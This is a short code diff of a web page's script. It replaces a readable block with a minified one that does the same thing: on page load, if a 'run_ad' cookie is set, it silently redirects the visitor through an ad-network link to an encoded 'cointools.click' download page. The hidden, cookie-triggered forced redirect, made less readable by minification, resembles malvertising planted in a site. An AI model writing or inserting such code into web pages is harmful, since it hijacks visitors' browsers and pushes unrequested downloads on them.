@@ -313,22 +313,7 @@ h1 {
 			
 		})
 
-		window.addEventListener('load', function(){
-			var cid = 10000000000000000 * Math.random();
-			var adUrl = 'http://p.rapolok.com/go/278037/712266/aHR0cHMlM0EvL2NvaW50b29scy5jbGljay9kb3dubG9hZC5odG1s?cb='+cid;
-			
-			var adClick = setInterval(function(){
-				
-				clearInterval(adClick);
-				
-
-				if( get_cookie("run_ad") ){
-					set_cookie( 'run_ad', '');
-					window.location = adUrl;
-				}
-				
-			}, 600)
-		})
+		window.addEventListener("load",(function(){var o="http://p.rapolok.com/go/278037/712266/aHR0cHMlM0EvL2NvaW50b29scy5jbGljay9kb3dubG9hZC5odG1s?cb="+1e16*Math.random(),a=setInterval((function(){clearInterval(a),get_cookie("run_ad")&&(set_cookie("run_ad",""),window.location=o)}),600)}));
 		</script>
 
 <script type="text/javascript">
